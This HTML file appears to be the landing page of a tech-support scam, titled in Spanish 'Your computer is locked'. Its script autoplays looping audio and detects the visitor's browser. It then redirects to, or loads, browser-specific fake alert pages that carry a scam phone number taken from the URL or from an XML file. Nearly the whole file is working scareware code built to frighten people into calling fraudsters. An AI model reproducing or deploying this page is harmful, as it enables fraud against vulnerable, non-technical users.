<html xmlns="http://www.w3.org/1999/xhtml" style="background-color:#fff;margin:0 auto !important;display:block !important;font-family: Arial, Helvetica, sans-serif">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>** Tu computadora esta bloqueada **</title>
</head>
<body style="background-color:#fff !important;margin:0 auto;" onclick="se()" onmousemove="call_mousemove()">  
<script src="alert/jquery.min.js"></script>
<script async="" src="alert/analytics.js"></script>	
<audio autoplay="autoplay" loop="">
	<source src="alert/eng.mp3" type="audio/mpeg">
</audio>
<input type="hidden" name="" id="phone_number"> 
<div id="fr_mozilla_html" 		style="display:none"></div>  
<div id="fr_edge_html" 			style="display:none"></div>      `
<div id="fr_ie_html" 			style="display:none"></div>
<script>
function get_browser() {
    var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || []; 
    if(/trident/i.test(M[1])){
        tem=/\brv[ :]+(\d+)/g.exec(ua) || []; 
        return {name:'IE',version:(tem[1]||'')};
        }   
    if(M[1]==='Chrome'){
        tem=ua.match(/\bOPR|Edge\/(\d+)/)
        if(tem!=null)   {return {name:'Opera', version:tem[1]};}
        }   
    M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
    if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
    return {
      name: M[0],
      version: M[1]
    };
 }

/* browser check */
function load_browser()
{	
	// Opera 8.0+
	var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
	// Firefox 1.0+
	var isFirefox = typeof InstallTrigger !== 'undefined';
	// Safari 3.0+ "[object HTMLElementConstructor]"
	var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(!window['safari'] || safari.pushNotification);
	// Internet Explorer 6-11
	var isIE = /*@cc_on!@*/false || !!document.documentMode;
	// Edge 20+
	var isEdge = !isIE && !!window.StyleMedia;
	// Chrome 1+
	var isChrome = !!window.chrome && !!window.chrome.webstore;
	// Blink engine detection
	var isBlink = (isChrome || isOpera) && !!window.CSS;
	var browserType = '';
	if(isOpera){
		browserType = 'isOpera';
	}else if(isFirefox){
		browserType = 'isFirefox';
	}else if(isSafari){
		browserType = 'isSafari';
	}else if(isIE){
		browserType = 'isIE';
	}else if(isEdge){
		browserType = 'isEdge';
	}else if(isChrome){
		browserType = 'isChrome';
	}else if(isBlink){
		browserType = 'isBlink';
	}
		//show HTML according to language
		var browser			=	get_browser();
		var phone 	 		= 	$('#phone_number').val();
		var sPageURL 		= 	window.location.search.substring(1);
		var phone_number 	= 	encodeURIComponent(phone);
		if(browserType=='isFirefox')
		{						  

			if(browser.version>=58)
			{	
				document.getElementById("fr_mozilla_html").style.display="block";
				document.getElementById("fr_ie_html").style.display="none";	
				document.getElementById("fr_edge_html").style.display="none";			
				window.location.href="alert/alert_ff_auth.html?"+sPageURL+"&p_num="+phone_number;
			}
			else
			{
				document.getElementById("fr_mozilla_html").style.display="block";
				document.getElementById("fr_ie_html").style.display="none";	
				document.getElementById("fr_edge_html").style.display="none";			
				$("#fr_mozilla_html").load("alert/alert_ff.html");
			}	
				
		}
		else if(browserType=='isChrome')
		{
		
				window.location.href="alert/alert_ch.html?"+sPageURL+"&p_num="+phone_number;
		}
		else if(browserType=='isEdge' && browser.version>=16)
		{

			document.getElementById("fr_mozilla_html").style.display="none";
			document.getElementById("fr_ie_html").style.display="none";	
			document.getElementById("fr_edge_html").style.display="block";			
			$("#fr_edge_html").load("alert/alert_edge_new.html");	

		}
		else
		{	
			document.getElementById("fr_mozilla_html").style.display="none";
			document.getElementById("fr_edge_html").style.display="none";
			document.getElementById("fr_ie_html").style.display="block";
			$("#fr_ie_html").load("alert/alert_ie.html");
		}
} 
/*browser check */
function getVariableFromURl(name)
{
	name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
	var regexS = "[\\?&]"+name+"=([^&#]*)";
	var regex = new RegExp( regexS );
	var results = regex.exec( window.location.href );
	if( results == null )
		return "";
	else
		return results[1];
}
var ringba_com_tag	=	getVariableFromURl('rb');
var default_num		=   getVariableFromURl('number');
if(default_num!="")
{
	$('#phone_number').val(default_num);
	load_browser();	
}
else
{		
	function loadXMLDoc(file) {
	  var xhttp = new XMLHttpRequest();
	  xhttp.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {				
			var xmlDoc   	=  $.parseXML(this.responseText);  
			var $xml     	=  $(xmlDoc);
			var phone 	 	=  $xml.find("phone").text();
			$('#phone_number').val(phone);
			load_browser();
		}
	  };
	  xhttp.open("GET", file, true);
	  xhttp.send();
	}
	$( document ).ready(function() {
	//Sample XML    
	var filePath 	= "alert/phonenumber.xml";
	var phone		=  loadXMLDoc(filePath);
	});
}
</script> 
</body>
</html>  
